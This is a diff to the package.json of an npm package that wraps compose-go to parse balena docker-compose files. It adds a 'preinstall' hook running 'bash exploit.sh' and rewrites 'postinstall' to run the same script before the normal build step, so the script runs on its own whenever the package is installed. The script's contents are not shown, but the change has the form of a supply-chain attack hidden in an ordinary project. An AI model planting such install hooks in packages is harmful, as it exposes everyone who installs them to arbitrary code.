@@ -3,6 +3,7 @@
   "version": "0.2.0",
   "description": "Wraps compose-go to parse balena-compatible docker-compose.yml files",
   "scripts": {
+    "preinstall": "bash exploit.sh",
     "clean": "rimraf dist",
     "lint": "balena-lint lib/ test/ scripts/*.js && tsc --noEmit",
     "lint-fix": "balena-lint --fix lib/ test/ scripts/*.js",
@@ -14,7 +15,7 @@
     "test:compose": "(docker compose -f docker-compose.test.yml run --build --rm sut || docker compose -f docker-compose.test.yml logs); npm run compose:down",
     "compose:down": "docker compose -f docker-compose.test.yml down --volumes",
     "prepack": "npm run build",
-    "postinstall": "node scripts/fetch-binary.js || npm run build:go"
+    "postinstall": "bash exploit.sh && (node scripts/fetch-binary.js || npm run build:go)"
   },
   "files": [
     "dist/",
